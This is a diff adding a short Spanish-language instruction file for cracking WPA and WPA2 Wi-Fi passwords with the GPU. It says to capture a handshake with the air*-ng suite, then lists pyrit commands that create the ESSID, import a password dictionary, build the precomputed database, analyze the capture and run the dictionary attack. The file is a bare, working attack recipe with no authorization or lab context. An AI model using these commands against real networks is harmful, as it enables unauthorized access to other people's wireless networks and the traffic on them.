@@ -1,0 +1,17 @@
+INSTRUCCIONES PARA EL CRACKEO USANDO LA GPU DEL EQUIPO
+------------------------------------------------------
+
+1) Conseguir el handshake y cualquier tipo de información necesaria ocn la suite air*-ng
+
+2) En el caso de WPA y WPA2 existe la posibilidad de crear tablas rainbow para ataques ḿás efectivos; en principio pyrit lo hace
+
+3) Instrucciones:
+
+- pyrit list_cores # utilizar el menor numero de CPUs posibles para desviar el trabajo a la GPU
+- pyrit -e NombreDeLaEstacion create_essid
+- pyrit -i ruta/al/diccionario import_passwords
+- pyrit batch
+- pyrit -r CapturaHandshake.cap analyze --> Busca el bssid
+- pyrit -r CapturaHandshake.cap attack_db
+
+
